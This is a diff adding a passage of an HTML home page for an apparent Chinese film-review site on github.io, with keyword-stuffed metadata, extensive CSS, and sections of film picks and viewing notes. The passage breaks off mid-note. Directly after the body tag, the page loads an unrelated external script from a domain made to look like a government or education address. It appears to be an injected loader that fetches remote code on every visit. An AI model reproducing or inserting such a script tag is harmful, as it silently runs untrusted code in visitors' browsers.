@@ -1,0 +1,661 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>彩霞电影网 ❀ 彩霞电影网——光影画廊与观影笔记｜彩霞电影网经典修复与独立电影推荐，彩霞电影网慢节奏观影社区</title>
+<meta name="description" content="彩霞电影网是一个以慢节奏观影为核心理念的光影画廊与观影笔记社区，专注经典电影修复资源、独立电影推荐、艺术院线片单与观众真实观影笔记。我们不追逐院线票房热点，而是把镜头对准那些需要安静坐下来看完的片子——从上世纪七八十年代的老片到当代独立导演的小成本作品，从东亚家庭伦理到拉美魔幻现实主义，每一部都附有修复版本信息、观看渠道提示与编辑部的一手观感。彩霞电影网每日更新一篇观影笔记，每周整理一张主题片单，希望成为观众发现好电影的安静入口。所有推荐均标注合法观看渠道与版权归属，拒绝盗版资源与违规内容传播。">
+<meta name="keywords" content="彩霞电影网, 彩霞电影网光影画廊, 彩霞电影网观影笔记, 彩霞电影网经典电影修复, 彩霞电影网独立电影推荐, 彩霞电影网慢节奏观影社区, 彩霞电影网艺术院线片单">
+<meta name="robots" content="index,follow,max-snippet:220,max-image-preview:large">
+<meta name="theme-color" content="#c2416c">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="author" content="彩霞电影网编辑部">
+<meta property="og:type" content="website">
+<meta property="og:title" content="彩霞电影网——光影画廊与观影笔记，慢节奏观影社区">
+<meta property="og:description" content="专注经典电影修复、独立电影推荐与艺术院线片单，每日一篇观影笔记，每周一张主题片单。">
+<meta property="og:url" content="https://caixiadianyingwang-zh.github.io/">
+<link rel="canonical" href="https://caixiadianyingwang-zh.github.io/">
+<style>
+*,*::before,*::after{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{margin:0;background:#fff8f6;color:#3f2330;font:15px/1.85 "PingFang SC","Microsoft YaHei","Noto Sans CJK SC",sans-serif;-webkit-font-smoothing:antialiased}
+a{color:inherit;text-decoration:none}
+ul{list-style:none;margin:0;padding:0}
+img{max-width:100%;display:block}
+:root{
+  --pink:#c2416c; --pink2:#e05586; --rose:#f43f5e; --plum:#9d174d;
+  --cream:#fff8f6; --paper:#fff2ef; --paper2:#ffe4de;
+  --ink:#3f2330; --ink2:#6b4a57; --mute:#9d7b88;
+  --amber:#d97706; --teal:#0d9488; --indigo:#4f46e5; --lime:#65a30d; --sky:#0284c7;
+  --shadow:0 6px 24px rgba(157,23,77,.08);
+}
+.wrap{max-width:1160px;margin:0 auto;padding:0 24px}
+
+/* 顶部花瓣条 */
+.petalbar{height:7px;background:linear-gradient(90deg,#fbcfe8 0%,#f9a8d4 22%,#f472b6 40%,#fda4af 58%,#f0abfc 76%,#e9d5ff 100%);background-size:200% 100%;animation:flow 14s linear infinite}
+@keyframes flow{to{background-position:200% 0}}
+
+/* 头部 */
+header{background:#fff;border-bottom:1px solid var(--paper2)}
+.head{max-width:1160px;margin:0 auto;padding:22px 24px;display:grid;grid-template-columns:auto 1fr auto;gap:34px;align-items:center}
+.brand{display:flex;align-items:center;gap:15px}
+.logo{width:58px;height:58px;border-radius:50%;background:linear-gradient(135deg,#fbcfe8,#f43f5e);position:relative;display:grid;place-items:center;color:#fff;flex-shrink:0;box-shadow:0 4px 14px rgba(244,63,94,.28)}
+.logo b{font-size:20px;font-weight:900;letter-spacing:-.5px}
+.logo::after{content:"❀";position:absolute;right:-5px;bottom:-4px;font-size:15px;color:var(--amber);text-shadow:0 0 4px #fff}
+.brand-txt h1{margin:0;font-size:26px;font-weight:900;letter-spacing:.5px;color:var(--plum);line-height:1.2}
+.brand-txt p{margin:3px 0 0;font-size:11.5px;color:var(--mute);letter-spacing:1.4px}
+.head-msg{text-align:center;font-size:13px;color:var(--ink2);max-width:420px;line-height:1.9}
+.head-msg b{display:block;color:var(--pink);font-size:14px;font-weight:900;margin-bottom:2px}
+.head-r{display:flex;flex-direction:column;gap:10px;align-items:flex-end}
+.clock{font-size:12.5px;color:var(--mute);font-variant-numeric:tabular-nums;display:flex;align-items:center;gap:7px}
+.clock::before{content:"🕐";font-size:13px}
+.head-r a{font-size:13px;font-weight:800;color:#fff;background:var(--pink);padding:9px 20px;border-radius:22px;transition:.18s;box-shadow:var(--shadow)}
+.head-r a:hover{background:var(--plum);transform:translateY(-2px)}
+
+/* 导航 */
+nav{background:var(--plum);position:sticky;top:0;z-index:50}
+.nav{max-width:1160px;margin:0 auto;padding:0 24px;display:flex;gap:2px;overflow-x:auto}
+.nav::-webkit-scrollbar{display:none}
+.nav a{padding:15px 19px;font-size:13.5px;font-weight:700;color:#fbcfe8;white-space:nowrap;transition:.16s;position:relative}
+.nav a:hover{color:#fff;background:rgba(255,255,255,.08)}
+.nav a.on{color:#fff;background:rgba(255,255,255,.12)}
+.nav a.on::before{content:"❀";position:absolute;left:7px;top:6px;font-size:8px;color:var(--paper2)}
+.nav a.on{padding-left:24px}
+
+/* 首屏画廊 */
+.hero{position:relative;padding:64px 0 72px;background:radial-gradient(circle at 12% 20%,#ffe4e6 0%,transparent 42%),radial-gradient(circle at 88% 30%,#fae8ff 0%,transparent 40%),radial-gradient(circle at 50% 90%,#fef3c7 0%,transparent 38%),linear-gradient(135deg,#fff1f2,#fff8f6)}
+.hero-in{max-width:1160px;margin:0 auto;padding:0 24px;position:relative;z-index:2}
+.hero-tag{display:inline-flex;align-items:center;gap:8px;background:#fff;border:1px solid var(--paper2);border-radius:22px;padding:6px 16px 6px 10px;font-size:12.5px;color:var(--pink);font-weight:800;box-shadow:var(--shadow)}
+.hero-tag i{width:20px;height:20px;border-radius:50%;background:var(--pink);color:#fff;font-size:11px;font-style:normal;display:grid;place-items:center}
+.hero h2{margin:18px 0 14px;font-size:clamp(28px,5vw,54px);font-weight:900;line-height:1.28;letter-spacing:-.5px;color:var(--plum)}
+.hero h2 em{font-style:normal;background:linear-gradient(120deg,var(--pink),var(--amber));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero-desc{max-width:640px;font-size:16.5px;color:var(--ink2);line-height:2}
+.hero-acts{margin-top:30px;display:flex;gap:12px;flex-wrap:wrap;align-items:center}
+.btn2{border:2px solid var(--pink);background:var(--pink);color:#fff;border-radius:26px;padding:12px 26px;font-size:14px;font-weight:900;cursor:pointer;transition:.18s}
+.btn2:hover{background:var(--plum);border-color:var(--plum);transform:translateY(-2px)}
+.btn2.ghost{background:transparent;color:var(--pink)}
+.btn2.ghost:hover{background:var(--pink);color:#fff}
+.hero-stats{margin-top:40px;display:grid;grid-template-columns:repeat(4,1fr);gap:0;max-width:700px}
+.hero-stats div{padding:0 20px;border-left:1px dashed var(--paper2)}
+.hero-stats div:first-child{border-left:0;padding-left:0}
+.hero-stats b{display:block;font-size:24px;font-weight:900;color:var(--plum);font-family:Georgia,serif}
+.hero-stats span{font-size:12px;color:var(--mute)}
+
+/* 通用区块 */
+section{padding:64px 0}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:20px;margin-bottom:32px;flex-wrap:wrap}
+.sec-head .l .badge{display:inline-block;font-size:11px;font-weight:900;letter-spacing:1.6px;color:var(--pink);background:var(--paper);border-radius:5px;padding:4px 11px;margin-bottom:9px}
+.sec-head .l h3{margin:0;font-size:clamp(21px,3vw,30px);font-weight:900;color:var(--plum);letter-spacing:.3px}
+.sec-head .l h3 small{display:block;font-size:13px;font-weight:600;color:var(--mute);margin-top:5px;letter-spacing:.4px}
+.sec-head .r{font-size:12.5px;color:var(--mute);display:flex;gap:12px;align-items:center;flex-wrap:wrap}
+.sec-head .r a{color:var(--pink);font-weight:800;border-bottom:1px solid transparent}
+.sec-head .r a:hover{border-bottom-color:var(--pink)}
+
+/* 今日精选：大卡 + 小卡 */
+.today{display:grid;grid-template-columns:1.25fr 1fr;gap:22px;align-items:start}
+.featured{position:relative;border-radius:22px;overflow:hidden;min-height:420px;display:flex;flex-direction:column;justify-content:flex-end;padding:30px;color:#fff;box-shadow:var(--shadow)}
+.featured::before{content:"";position:absolute;inset:0;background:linear-gradient(165deg,rgba(157,23,77,0) 30%,rgba(76,29,49,.92) 100%)}
+.featured::after{content:"";position:absolute;inset:0;background:linear-gradient(135deg,#7c2d12,#9d174d);z-index:-1}
+.f-tag{position:absolute;top:22px;left:22px;background:rgba(255,255,255,.2);backdrop-filter:blur(6px);border:1px solid rgba(255,255,255,.3);border-radius:20px;padding:5px 14px;font-size:12px;font-weight:800;z-index:2}
+.f-art{position:absolute;right:22px;top:22px;z-index:2;font-size:11.5px;background:var(--amber);color:#fff;border-radius:8px;padding:5px 11px;font-weight:800}
+.featured .f-c{position:relative;z-index:2}
+.featured h4{margin:0 0 9px;font-size:29px;font-weight:900;line-height:1.35}
+.featured p{margin:0 0 18px;font-size:14px;line-height:1.9;color:#fbcfe8;max-width:520px}
+.f-meta{display:flex;gap:22px;flex-wrap:wrap;font-size:12.5px;color:#fda4af}
+.f-meta span b{color:#fff;font-weight:900}
+.f-line{margin:15px 0 0;height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,.35),transparent)}
+.f-acts{margin-top:18px;display:flex;gap:10px;flex-wrap:wrap}
+.f-acts button{border:0;background:rgba(255,255,255,.18);color:#fff;backdrop-filter:blur(4px);border-radius:20px;padding:8px 17px;font-size:12.5px;font-weight:800;cursor:pointer;transition:.16s}
+.f-acts button:hover{background:#fff;color:var(--plum)}
+
+.mini-list{display:flex;flex-direction:column;gap:14px}
+.mini{background:#fff;border:1px solid var(--paper2);border-radius:16px;padding:16px 18px;display:grid;grid-template-columns:54px 1fr;gap:15px;align-items:center;transition:.2s;box-shadow:var(--shadow)}
+.mini:hover{border-color:var(--pink);transform:translateX(4px)}
+.mini .thumb{width:54px;height:70px;border-radius:8px;display:grid;place-items:center;color:#fff;font-size:13px;font-weight:900;position:relative}
+.mini .thumb small{position:absolute;right:3px;bottom:2px;font-size:9px;background:rgba(0,0,0,.4);padding:0 4px;border-radius:3px}
+.mini h5{margin:0;font-size:15px;font-weight:900;color:var(--ink)}
+.mini p{margin:4px 0 0;font-size:12px;color:var(--mute);line-height:1.6}
+.mini .dot{display:inline-block;width:6px;height:6px;border-radius:50%;background:var(--pink);margin-right:6px}
+
+/* 画廊网格 */
+.gallery{display:grid;grid-template-columns:repeat(3,1fr);gap:22px}
+.card{background:#fff;border-radius:18px;overflow:hidden;border:1px solid var(--paper2);transition:.26s;box-shadow:var(--shadow)}
+.card:hover{transform:translateY(-7px);box-shadow:0 18px 40px rgba(157,23,77,.14);border-color:#f9a8d4}
+.card .cv{height:200px;position:relative;display:grid;place-items:center;color:#fff;overflow:hidden}
+.card .cv::before{content:"";position:absolute;inset:0;background:radial-gradient(circle at 80% 20%,rgba(255,255,255,.22),transparent 55%)}
+.card .cv b{position:relative;z-index:2;font-size:19px;font-weight:900;text-align:center;line-height:1.4;text-shadow:0 2px 12px rgba(0,0,0,.25);padding:0 14px}
+.card .cv .yr{position:absolute;left:16px;top:14px;z-index:2;font-size:11px;background:rgba(255,255,255,.22);padding:3px 10px;border-radius:12px;backdrop-filter:blur(4px)}
+.card .cv .rt{position:absolute;right:14px;bottom:12px;z-index:2;font-size:11px;font-weight:800}
+.card .cv .bk{position:absolute;right:14px;top:12px;z-index:2;font-size:11px;background:var(--amber);color:#fff;border-radius:7px;padding:3px 9px;font-shadow:none}
+.card .bd{padding:18px 20px 20px}
+.card .bd .rw{display:flex;justify-content:space-between;align-items:center;font-size:12px;color:var(--mute);margin-bottom:9px}
+.card .bd .rw b{color:var(--pink);font-weight:900}
+.card .bd h4{margin:0;font-size:16.5px;font-weight:900;color:var(--ink);line-height:1.5}
+.card .bd p{margin:8px 0 14px;font-size:13px;color:var(--ink2);line-height:1.85}
+.tags{display:flex;gap:6px;flex-wrap:wrap}
+.tags span{font-size:11px;background:var(--paper);color:var(--pink);border-radius:11px;padding:3px 10px;font-weight:700}
+
+/* 放映厅 */
+.rooms{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.room{background:#fff;border:1px solid var(--paper2);border-radius:16px;padding:20px 18px;transition:.2s;position:relative;overflow:hidden}
+.room::before{content:"";position:absolute;top:0;left:0;right:0;height:3px;background:var(--c,var(--pink))}
+.room:hover{transform:translateY(-4px);box-shadow:var(--shadow)}
+.room .ic{font-size:24px;margin-bottom:10px}
+.room h4{margin:0 0 7px;font-size:15.5px;font-weight:900;color:var(--ink)}
+.room p{margin:0;font-size:12.5px;color:var(--mute);line-height:1.8}
+.room .go{display:inline-block;margin-top:13px;font-size:12px;font-weight:900;color:var(--pink)}
+
+/* 观影笔记 */
+.notes{display:grid;grid-template-columns:1.4fr 1fr;gap:26px;align-items:start}
+.note{background:#fff;border:1px solid var(--paper2);border-radius:18px;padding:0;overflow:hidden;box-shadow:var(--shadow)}
+.note-h{padding:22px 26px 0}
+.note-h .dt{font-size:11.5px;color:var(--mute);display:flex;gap:14px;align-items:center;flex-wrap:wrap}
+.note-h .dt b{color:var(--pink);font-weight:900}
+.note-h h4{margin:10px 0 12px;font-size:22px;font-weight:900;line-height:1.55;color:var(--plum)}
+.note-body{padding:0 26px 22px}
+.note-body p{margin:0 0 14px;font-size:14.5px;color:var(--ink2);line-height:2;text-indent:2em}
+.note-body p:first-of-type::first-letter{font-size:34px;font-weight:900;color:var(--pink);float:left;line-height:.95;margin:5px 8px 0 0}
+.note-ft{padding:16px 26px;background:var(--paper);display:flex;justify-content:space-between;align-items:center;border-top:1px solid var(--paper2);font-size:12.5px;color:var(--mute);flex-wrap:wrap;gap:10px}
+.note-ft .who{display:flex;align-items:center;gap:9px}
+.note-ft .ava{width:28px;height:28px;border-radius:50%;background:linear-gradient(135deg,var(--pink),var(--amber));color:#fff;font-size:12px;font-weight:900;display:grid;place-items:center}
+.note-side{display:flex;flex-direction:column;gap:14px}
+.note-mini{background:#fff;border:1px solid var(--paper2);border-left:3px solid var(--pink);border-radius:10px;padding:15px 17px;transition:.18s}
+.note-mini:hover{background:var(--paper);transform:translateX(3px)}
+.note-mini .dt{font-size:11px;color:var(--mute);margin-bottom:5px}
+.note-mini h5{margin:0 0 6px;font-size:14.5px;font-weight:900;color:var(--ink);line-height:1.6}
+.note-mini p{margin:0;font-size:12.5px;color:var(--ink2);line-height:1.8}
+
+/* 编辑部 */
+.editors{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+.editor{background:#fff;border:1px solid var(--paper2);border-radius:16px;padding:24px 22px;transition:.2s;text-align:center}
+.editor:hover{background:var(--paper);transform:translateY(-4px)}
+.editor .ava{width:72px;height:72px;border-radius:50%;margin:0 auto 14px;display:grid;place-items:center;color:#fff;font-size:20px;font-weight:900;position:relative}
+.editor .ava::after{content:attr(data-role);position:absolute;bottom:-6px;left:50%;transform:translateX(-50%);font-size:10px;background:var(--plum);color:#fff;border-radius:9px;padding:2px 9px;white-space:nowrap;font-weight:700}
+.editor h4{margin:16px 0 4px;font-size:16px;font-weight:900;color:var(--ink)}
+.editor .bio{font-size:12.5px;color:var(--mute);line-height:1.8}
+.editor .loves{margin-top:13px;display:flex;gap:6px;justify-content:center;flex-wrap:wrap}
+.editor .loves span{font-size:11px;background:var(--paper2);color:var(--plum);border-radius:10px;padding:3px 9px}
+
+/* 放映日历 */
+.cal{background:#fff;border:1px solid var(--paper2);border-radius:20px;padding:26px;box-shadow:var(--shadow)}
+.cal-h{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;flex-wrap:wrap;gap:12px}
+.cal-h b{font-size:17px;color:var(--plum);font-weight:900}
+.cal-h .navb{display:flex;gap:7px}
+.cal-h .navb button{border:1px solid var(--paper2);background:#fff;width:30px;height:30px;border-radius:8px;cursor:pointer;font-size:13px;color:var(--pink);transition:.15s}
+.cal-h .navb button:hover{background:var(--pink);color:#fff}
+.weekdays{display:grid;grid-template-columns:repeat(7,1fr);gap:8px;margin-bottom:8px}
+.weekdays span{text-align:center;font-size:11.5px;color:var(--mute);font-weight:800}
+.days{display:grid;grid-template-columns:repeat(7,1fr);gap:8px}
+.day{aspect-ratio:1/1;border:1px solid var(--paper);border-radius:11px;padding:7px 8px;display:flex;flex-direction:column;justify-content:space-between;transition:.16s;cursor:default}
+.day:hover{border-color:var(--pink);background:var(--paper)}
+.day .n{font-size:13px;font-weight:800;color:var(--ink2);font-variant-numeric:tabular-nums}
+.day .ev{width:6px;height:6px;border-radius:50%;align-self:flex-end}
+.day.today{background:linear-gradient(135deg,var(--pink),var(--rose));border-color:var(--pink)}
+.day.today .n{color:#fff}
+.day.has .n{color:var(--plum)}
+.cal-legend{display:flex;gap:20px;margin-top:18px;font-size:12px;color:var(--mute);flex-wrap:wrap;padding-top:16px;border-top:1px dashed var(--paper2)}
+.cal-legend i{display:inline-block;width:9px;height:9px;border-radius:50%;margin-right:6px;vertical-align:-1px}
+
+/* 片单卡片 */
+.lists{display:grid;grid-template-columns:repeat(2,1fr);gap:22px}
+.list{background:#fff;border:1px solid var(--paper2);border-radius:18px;padding:24px;transition:.22s}
+.list:hover{box-shadow:var(--shadow);transform:translateY(-4px)}
+.list .lh{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:16px}
+.list .lh h4{margin:0;font-size:17px;font-weight:900;color:var(--plum)}
+.list .lh span{font-size:11px;color:var(--mute);white-space:nowrap}
+.filmrow{display:grid;grid-template-columns:26px 1fr auto;gap:12px;align-items:center;padding:10px 0;border-bottom:1px dashed var(--paper);font-size:13.5px}
+.filmrow:last-child{border-bottom:0}
+.filmrow .no{font-family:Georgia,serif;font-size:13px;font-weight:900;color:var(--pink)}
+.filmrow .nm{font-weight:800;color:var(--ink)}
+.filmrow .yr{font-size:11.5px;color:var(--mute);font-variant-numeric:tabular-nums}
+
+/* FAQ */
+.faqs{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.faq{background:#fff;border:1px solid var(--paper2);border-radius:14px;overflow:hidden;transition:.18s}
+.faq:hover{border-color:#f9a8d4}
+.faq[open]{border-color:var(--pink);box-shadow:var(--shadow)}
+.faq summary{cursor:pointer;padding:18px 20px;font-size:14.5px;font-weight:900;color:var(--ink);display:flex;align-items:center;gap:12px;list-style:none}
+.faq summary::-webkit-details-marker{display:none}
+.faq summary::before{content:attr(data-no);font-family:Georgia,serif;font-size:12px;font-weight:900;color:#fff;background:var(--pink);width:22px;height:22px;border-radius:6px;display:grid;place-items:center;flex-shrink:0}
+.faq summary .q{margin-left:auto;font-size:12px;color:var(--mute);font-weight:600}
+.faq[open] summary{background:var(--paper)}
+.faq p{padding:0 20px 18px 54px;margin:0;font-size:13.5px;color:var(--ink2);line-height:1.95}
+
+/* 留言 */
+.letters{display:grid;grid-template-columns:1fr 1fr;gap:26px;align-items:start}
+.letter{background:#fff;border:1px solid var(--paper2);border-radius:18px;padding:24px;box-shadow:var(--shadow)}
+.letter form{display:flex;flex-direction:column;gap:13px}
+.letter .fg{display:flex;flex-direction:column;gap:5px}
+.letter label{font-size:12px;font-weight:900;color:var(--pink);letter-spacing:.5px}
+.letter input,.letter textarea,.letter select{width:100%;padding:11px 13px;border:1.5px solid var(--paper2);border-radius:10px;font-size:14px;background:#fff;transition:.16s;font-family:inherit}
+.letter input:focus,.letter textarea:focus,.letter select:focus{outline:none;border-color:var(--pink);background:var(--paper)}
+.letter textarea{min-height:110px;resize:vertical}
+.letter .row2{display:grid;grid-template-columns:1fr 1fr;gap:13px}
+.letter button{border:0;background:linear-gradient(120deg,var(--pink),var(--rose));color:#fff;border-radius:12px;padding:14px;font-size:15px;font-weight:900;cursor:pointer;transition:.2s;box-shadow:var(--shadow)}
+.letter button:hover{transform:translateY(-2px);box-shadow:0 10px 26px rgba(244,63,94,.3)}
+.letter .tip{font-size:11.5px;color:var(--mute);line-height:1.8;margin-top:4px}
+.l-box{background:linear-gradient(160deg,#fff1f2,#fdf2f8);border:1px solid var(--paper2);border-radius:18px;padding:24px}
+.l-box h4{margin:0 0 16px;font-size:15.5px;font-weight:900;color:var(--plum)}
+.l-item{padding:14px 0;border-bottom:1px dashed var(--paper2);font-size:13.5px;color:var(--ink2);line-height:1.85}
+.l-item:last-child{border-bottom:0}
+.l-item .who{display:block;font-size:12px;color:var(--pink);font-weight:900;margin-bottom:4px}
+.l-item .who time{font-weight:400;color:var(--mute);margin-left:8px;font-variant-numeric:tabular-nums}
+
+/* 页脚 */
+footer{background:var(--plum);color:#fbcfe8;padding:56px 0 0}
+.foot{max-width:1160px;margin:0 auto;padding:0 24px;display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:40px}
+.foot .f1 b{font-size:22px;color:#fff;font-weight:900;letter-spacing:.5px}
+.foot .f1 p{margin:14px 0 0;font-size:13.5px;line-height:2;max-width:340px}
+.foot .f1 .social{margin-top:20px;display:flex;gap:9px;flex-wrap:wrap}
+.foot .f1 .social a{width:36px;height:36px;border-radius:50%;background:rgba(255,255,255,.1);display:grid;place-items:center;font-size:14px;transition:.16s}
+.foot .f1 .social a:hover{background:var(--pink2)}
+.foot h5{margin:0 0 16px;font-size:11.5px;letter-spacing:2px;color:#fda4af;font-weight:900}
+.foot ul{display:flex;flex-direction:column;gap:10px}
+.foot li a{font-size:13.5px;color:#f5a9c4;transition:.15s}
+.foot li a:hover{color:#fff;padding-left:4px}
+.foot-b{max-width:1160px;margin:42px auto 0;padding:20px 24px;border-top:1px solid rgba(255,255,255,.12);display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap;font-size:12px;color:#e9a8c2}
+.foot-b .links{display:flex;gap:16px;flex-wrap:wrap}
+.foot-b .links a{color:#f5a9c4}
+.foot-b .links a:hover{color:#fff}
+.foot-b b{color:#fda4af}
+
+/* 回到顶部 */
+.top{position:fixed;right:18px;bottom:22px;width:44px;height:44px;border-radius:50%;background:var(--pink);color:#fff;border:0;font-size:16px;cursor:pointer;box-shadow:0 6px 18px rgba(157,23,77,.3);opacity:0;pointer-events:none;transition:.24s;z-index:60}
+.top.show{opacity:1;pointer-events:auto}
+.top:hover{background:var(--plum);transform:translateY(-3px)}
+
+/* 响应式 */
+@media(max-width:1000px){
+  .gallery,.editors{grid-template-columns:repeat(2,1fr)}
+  .rooms{grid-template-columns:repeat(2,1fr)}
+  .foot{grid-template-columns:1fr 1fr 1fr}
+}
+@media(max-width:820px){
+  .head{grid-template-columns:1fr;gap:16px;text-align:left}
+  .head-msg,.head-r{align-items:flex-start;text-align:left}
+  .head-r{align-items:center}
+  .today,.notes,.letters,.lists{grid-template-columns:1fr}
+  .faqs{grid-template-columns:1fr}
+  .hero-stats{grid-template-columns:repeat(4,1fr);gap:0}
+  .hero-stats div{padding:0 8px}
+  .hero-stats b{font-size:18px}
+}
+@media(max-width:560px){
+  .wrap,.head,.nav,.foot,.foot-b{padding-left:15px;padding-right:15px}
+  section{padding:44px 0}
+  .hero{padding:42px 0 50px}
+  .gallery,.editors,.rooms{grid-template-columns:1fr}
+  .foot{grid-template-columns:1fr}
+  .foot-b{flex-direction:column;align-items:flex-start}
+  .sec-head{flex-direction:column;align-items:flex-start}
+  .nav a{padding:13px 15px;font-size:12.5px}
+  .brand-txt h1{font-size:20px}
+  .logo{width:48px;height:48px}
+  .logo b{font-size:16px}
+  .hero-stats{grid-template-columns:2fr 2fr;gap:12px 0}
+  .hero-stats div{border-left:0;padding:8px 6px}
+  .featured{min-height:360px;padding:22px}
+  .featured h4{font-size:22px}
+  .letter .row2{grid-template-columns:1fr}
+  .weekdays span:nth-child(n+6),.day:nth-child(7n+0){display:none}
+  .weekdays{grid-template-columns:repeat(5,1fr)}
+  .days{grid-template-columns:repeat(5,1fr)}
+  .mini{grid-template-columns:48px 1fr}
+  .mini .thumb{width:48px;height:62px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="petalbar"></div>
+
+<!-- 头部 -->
+<header><div class="head">
+  <div class="brand">
+    <div class="logo"><b>彩霞</b></div>
+    <div class="brand-txt"><h1>彩霞电影网</h1><p>GALLERY OF LIGHT &amp; SHADOW</p></div>
+  </div>
+  <div class="head-msg"><b>不是最快的片单，是最值得坐下来的那一份</b>每日一篇观影笔记 · 每周一张主题片单 · 每年整理一次修复名录</div>
+  <div class="head-r">
+    <div class="clock" id="clock">--:--:--</div>
+    <a href="#letter">写一封观影信</a>
+  </div>
+</div></header>
+
+<!-- 导航 -->
+<nav><div class="nav">
+  <a href="#today" class="on">今日精选</a>
+  <a href="#gallery">光影画廊</a>
+  <a href="#rooms">放映厅</a>
+  <a href="#notes">观影笔记</a>
+  <a href="#editors">编辑部</a>
+  <a href="#cal">放映日历</a>
+  <a href="#lists">主题片单</a>
+  <a href="#why">选片方法</a>
+  <a href="#faq">常见疑问</a>
+  <a href="#letter">观影来信</a>
+</div></nav>
+
+<!-- 首屏 -->
+<section class="hero"><div class="hero-in">
+  <span class="hero-tag"><i>❀</i>本周主题：那些被忽略的亚洲女导演</span>
+  <h2>彩霞电影网，<em>把银幕上的光</em><br>收进一本可以慢慢翻的册子</h2>
+  <p class="hero-desc">彩霞电影网不追逐院线热点的速度与流量，只做一件事：为愿意安静看完一部电影的观众，挑出那些经得起反复回味的片子。从经典修复版本到当代独立创作，从长片到短片，每一部都有来处、有版本、有我们自己的观感。</p>
+  <div class="hero-acts">
+    <button class="btn2">从本周片单开始 →</button>
+    <button class="btn2 ghost">了解我们的选片标准</button>
+  </div>
+  <div class="hero-stats">
+    <div><b>1,427</b><span>已收录影片</span></div>
+    <div><b>386</b><span>修复版本标注</span></div>
+    <div><b>2,910</b><span>篇观影笔记</span></div>
+    <div><b>147</b><span>位常驻读者</span></div>
+  </div>
+</div></section>
+
+<!-- 今日精选 -->
+<section id="today"><div class="wrap">
+  <div class="sec-head"><div class="l">
+    <span class="badge">TODAY · 今日精选</span>
+    <h3>编辑部今天想给你看的<small>每天 21:00 更新，错过可在「观影笔记」回看</small></h3>
+  </div><div class="r"><span>更新时间 2026-10-06 21:00</span><a href="#notes">查看往期 →</a></div></div>
+  <div class="today">
+    <article class="featured">
+      <span class="f-tag">今日主推</span>
+      <span class="f-art">4K 修复版</span>
+      <div class="f-c">
+        <h4>《雾中风景》：一场没有尽头的童年远行</h4>
+        <p>安哲罗普洛斯的镜头里，雾永远不会散尽。两个孩子沿着铁轨去找一个可能根本不存在的父亲，而我们看见的是整个东欧在变迁中的沉默。4K 修复版本首次补齐了当年被剪掉的七分钟长镜头。</p>
+        <div class="f-meta"><span>导演 <b>西奥·安哲罗普洛斯</b></span><span>年份 <b>1988</b></span><span>片长 <b>127 分钟</b></span><span>地区 <b>希腊 / 法国 / 意大利</b></span></div>
+        <div class="f-line"></div>
+        <div class="f-acts">
+          <button>查看完整笔记 →</button>
+          <button>标注合法观看渠道</button>
+          <button>加入我的想看清单</button>
+        </div>
+      </div>
+    </article>
+    <div class="mini-list" id="miniBox"></div>
+  </div>
+</div></section>
+
+<!-- 光影画廊 -->
+<section id="gallery" style="padding-top:0"><div class="wrap">
+  <div class="sec-head"><div class="l">
+    <span class="badge">GALLERY · 光影画廊</span>
+    <h3>正在展映的十二部<small>按主题轮换，每月更换一次策展方向</small></h3>
+  </div><div class="r"><span>当前策展：十月的房间</span><a href="#">查看全部 1,427 部 →</a></div></div>
+  <div class="gallery" id="galBox"></div>
+</div></section>
+
+<!-- 放映厅 -->
+<section id="rooms"><div class="wrap">
+  <div class="sec-head"><div class="l">
+    <span class="badge">ROOMS · 四个放映厅</span>
+    <h3>按心情选一个厅坐下<small>同一个片子，不同的进入方式</small></h3>
+  </div><div class="r"><a href="#">放映厅使用说明 →</a></div></div>
+  <div class="rooms">
+    <div class="room" style="--c:#c2416c"><div class="ic">🌅</div><h4>晨光厅</h4><p>适合清晨或午后一个人看，片子不长，情绪不重，看完还能出门走一段路。多为短片与纪录片。</p><a class="go" href="#">进入 →</a></div>
+    <div class="room" style="--c:#d97706"><div class="ic">🌙</div><h4>夜航厅</h4><p>深夜场专属，长片、慢片、需要耐心的片子都在这里。建议配一杯茶，关掉手机。</p><a class="go" href="#">进入 →</a></div>
+    <div class="room" style="--c:#0d9488"><div class="ic">🪞</div><h4>镜面厅</h4><p>同一部片子放两个版本：院线版与导演剪辑版，或修复前后对比，方便对照观看。</p><a class="go" href="#">进入 →</a></div>
+    <div class="room" style="--c:#4f46e5"><div class="ic">🌿</div><h4>长椅厅</h4><p>为反复观看而设，收录我们回看过三遍以上的片子，附逐场笔记与镜头拆解。</p><a class="go" href="#">进入 →</a></div>
+  </div>
+</div></section>
+
+<!-- 观影笔记 -->
+<section id="notes" style="padding-top:0"><div class="wrap">
+  <div class="sec-head"><div class="l">
+    <span class="badge">NOTES · 观影笔记</span>
+    <h3>慢下来，写一点观感<small>编辑部手写，不生成模板化短评</small></h3>
+  </div><div class="r"><span>已写 2,910 篇</span><a href="#">查看全部笔记 →</a></div></div>
+  <div class="notes">
+    <article class="note">
+      <div class="note-h">
+        <div class="dt"><b>NO.2910</b><span>2026-10-06 周二</span><span>编辑部手记</span><span>阅读约 6 分钟</span></div>
+        <h4>《花样年华》：那件旗袍换了多少次，我们就错过多少次</h4>
+      </div>
+      <div class="note-body">
+        <p>第四次看这部片子，终于注意到走廊里的灯。王家卫让每一个镜头都像被人偷看，却又把每一个偷看的人都安排得心安理得。张曼玉的二十多套旗袍不是炫耀，是她唯一能控制的东西——既然不能控制自己的感情，至少可以控制身上穿什么。</p>
+        <p>最难受的不是他们没在一起，是他们明明那么想在一起，却各自回到自己该回的房间。那种克制在今天的电影里几乎绝迹了，大家都要说出口，都要发消息，都要确认。而 1962 年的香港，一个眼神就是一封长信。</p>
